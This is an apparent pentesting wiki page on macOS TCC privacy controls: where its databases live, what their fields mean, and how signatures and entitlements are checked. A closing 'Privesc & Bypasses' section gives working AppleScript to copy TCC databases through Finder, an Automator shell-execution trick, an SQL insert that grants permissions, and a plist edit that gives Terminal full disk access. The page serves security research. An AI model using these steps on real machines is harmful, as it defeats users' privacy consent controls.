## **Basic Information**

**TCC (Transparency, Consent, and Control)** is a mechanism in macOS to **limit and control application access to certain features**, usually from a privacy perspective. This can include things such as location services, contacts, photos, microphone, camera, accessibility, full disk access, and a bunch more.

From a user’s perspective, they see TCC in action **when an application wants access to one of the features protected by TCC**. When this happens the **user is prompted** with a dialog asking them whether they want to allow access or not.

It's also possible to **grant apps access** to files by **explicit intents** from users for example when a user **drags\&drop a file into a program** (obviously the program should have access to it).

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** is handled by the **daemon** located in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` and configured in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registering the mach service `com.apple.tccd.system`).

There is a **user-mode tccd** running per logged in user defined in `/System/Library/LaunchAgents/com.apple.tccd.plist` registering the mach services `com.apple.tccd` and `com.apple.usernotifications.delegate.com.apple.tccd`.

Here you can see the tccd running as system and as user:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Permissions are **inherited from the parent** application and the **permissions** are **tracked** based on the **Bundle ID** and the **Developer ID**.

### TCC Databases

The allowances/denies then stored in some TCC databases:

* The system-wide database in **`/Library/Application Support/com.apple.TCC/TCC.db`**  .
  * This database is **SIP protected**, so only a SIP bypass can write into it.
* The user TCC database **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** for per-user preferences.
  * This database is protected so only processes with high TCC privileges like Full Disk Access can write to it (but i't not protected by SIP).

{% hint style="warning" %}
The previous databases are also **TCC protected for read access**. So you **won't be able to read** your regular user TCC database unless it's from a TCC privileged process.

However, remember that a process with these high privileges (like **FDA** or **`kTCCServiceEndpointSecurityClient`**) will be able to write the users TCC database
{% endhint %}

* There is a **third** TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed to **access location services**.
* The SIP protected file **`/Users/carlospolop/Downloads/REG.db`** (also protected from read access with TCC), contains the **location** of all the **valid TCC databases**.
* The SIP protected file **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (also protected from read access with TCC), contains more TCC granted permissions.
* The SIP protected file **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (bu readable by anyone) is an allow list of applications that require a TCC exception.&#x20;

{% hint style="success" %}
The TCC database in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
The **notification center UI** can make **changes in the system TCC database**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

However, users can **delete or query rules** with the **`tccutil`** command line utility.
{% endhint %}

#### Query the databases

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="system DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Checking both databases you can check the permissions an app has allowed, has forbidden, or doesn't have (it will ask for it).
{% endhint %}

* The **`service`** is the TCC **permission** string representation
* The **`client`** is the **bundle ID** or **path to binary** with the permissions
* The **`client_type`** indicates whether it’s a Bundle Identifier(0) or an absolute path(1)

<details>

<summary>How to execute if it's an absolute path</summary>

Just do **`launctl load you_bin.plist`**, with a plist like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

* The **`auth_value`** can have different values: denied(0), unknown(1), allowed(2), or limited(3).
* The **`auth_reason`** can take the following values: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* The **csreq** field is there to indicate how to verify the binary to execute and grant the TCC permissions:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

* For more information about the **other fields** of the table [**check this blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

You could also check **already given permissions** to apps in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

{% hint style="success" %}
Users _can_ **delete or query rules** using **`tccutil`** .&#x20;
{% endhint %}

#### Reset TCC permissions

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

### TCC Signature Checks

The TCC **database** stores the **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the App asking to use the a permission is the correct one.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Therefore, other applications using the same name and bundle ID won't be able to access granted permissions given to other apps.
{% endhint %}

### Entitlements & TCC Permissions

Apps **don't only need** to **request** and have been **granted access** to some resources, they also need to **have the relevant entitlements**.\
For example **Telegram** has the entitlement `com.apple.security.device.camera` to request **access to the camera**. An **app** that **doesn't** have this **entitlement won't be able** to access the camera (and the user won't be be even asked for the permissions).

However, for apps to **access** to **certain user folders**, such as `~/Desktop`, `~/Downloads` and `~/Documents`, they **don't need** to have any specific **entitlements.** The system will transparently handle access and **prompt the user** as needed.

Apple's apps **won’t generate prompts**. They contain **pre-granted rights** in their **entitlements** list, meaning they will **never generate a popup**, **nor** they will show up in any of the **TCC databases.** For example:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

This will avoid Calendar ask the user to access reminders, calendar and the address book.

{% hint style="success" %}
Apart from some official documentation about entitlements it's also possible to find unofficial **interesting information about entitlements in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Some TCC permissions are: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... There is no public list that defines all of them but you can check this [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Sensitive unprotected places

* $HOME (itself)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### User Intent / com.apple.macl

As mentioned previously, it possible to **grant access to an App to a file by drag\&dropping it to it**. This access won't be specified in any TCC database but as an **extended** **attribute of the file**. This attribute will **store the UUID** of the allowed app:

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

{% hint style="info" %}
It's curious that the **`com.apple.macl`** attribute is managed by the **Sandbox**, not tccd.

Also note that if you move a file that allows the UUID of an app in your computer to a different compiter, because the same app will have different UIDs, it won't grant access to that app.
{% endhint %}

The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.

## TCC Privesc & Bypasses

### Insert into TCC

If at some point you manage to get write access over a TCC database you can use something like the following to add an entry (remove the comments):

<details>

<summary>Insert into TCC example</summary>

```sql
INSERT INTO access (
    service, 
    client, 
    client_type, 
    auth_value, 
    auth_reason, 
    auth_version, 
    csreq, 
    policy_id, 
    indirect_object_identifier_type, 
    indirect_object_identifier, 
    indirect_object_code_identity, 
    flags, 
    last_modified, 
    pid, 
    pid_version, 
    boot_uuid, 
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### Automation to FDA\*

The TCC name of the Automation permission is: **`kTCCServiceAppleEvents`**\
This specific TCC permission also indicates the **application that can be managed** inside the TCC database (so the permissions doesn't allow just to manage everything).

**Finder** is an application that **always has FDA** (even if it doesn't appear in the UI), so if you have **Automation** privileges over it, you can abuse its privileges to **make it do some actions**.\
In this case your app would need the permission **`kTCCServiceAppleEvents`** over **`com.apple.Finder`**.

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias

    try
        duplicate file sourceFile to targetFolder with replacing
    on error errMsg
        display dialog "Error: " & errMsg
    end try
end tell
EOD
```
{% endtab %}

{% tab title="Steal systems TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias

    try
        duplicate file sourceFile to targetFolder with replacing
    on error errMsg
        display dialog "Error: " & errMsg
    end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

You could abuse this to **write your own user TCC database**.

{% hint style="warning" %}
With this permission you will be able to **ask finder to access TCC restricted folders** and give you the files, but afaik you **won't be able to make Finder execute arbitrary code** to fully abuse his FDA access.

Therefore, you won't be able to abuse the full FDA habilities.
{% endhint %}

This is the TCC prompt to get Automation privileges over Finder:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Note that because the **Automator** app has the TCC permission **`kTCCServiceAppleEvents`**, it can **control any app**, like Finder. So having the permission to control Automator you could also control the **Finder** with a code like the one below:
{% endhint %}

<details>

<summary>Get a shell inside Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Same happens with **Script Editor app,** it can control Finder, but using an AppleScript you cannot force it to execute a script.

### **Endpoint Security Client to FDA**

If you have **`kTCCServiceEndpointSecurityClient`**, you have FDA. End.

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`** allows to **change** the **`NFSHomeDirectory`** attribute of a user that changes his home folder and therefore allows to **bypass TCC**.

### User TCC DB to FDA

Obtaining **write permissions** over the **user TCC** database you **can'**t grant yourself **`FDA`** permissions, only the one that lives in the system database can grant that.

But you can **can** give yourself **`Automation rights to Finder`**, and abuse the previous technique to escalate to FDA\*.

### **FDA to TCC permissions**

**Full Disk Access** is TCC name is **`kTCCServiceSystemPolicyAllFiles`**

I don't thing this is a real privesc, but just in case you find it useful: If you controls a program with FDA you can **modify the users TCC database and give yourself any access**. This can be useful as a persistence technique in case you might lose your FDA permissions.

### **SIP Bypass to TCC Bypass**

The system **TCC database** is protected by **SIP**, thats why only processes with the **indicated entitlements  are going to be able to modify** it. Therefore, if an attacker finds a **SIP bypass** over a **file** (be able to modify a file restricted by SIP), he will be able to:

* **Remove the protection** of a TCC database, and give himself all TCC permissions. He could abuse any of these files for example:
  * The TCC systems database
  * REG.db
  * MDMOverrides.plist

However, there is another option to abuse this **SIP bypass to bypass TCC**, the file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is an allow list of applications that require a TCC exception. Therefore, if an attacker can **remove the SIP protection** from this file and add his **own application** the application ill be able to bypass TCC.\
For example to add terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```
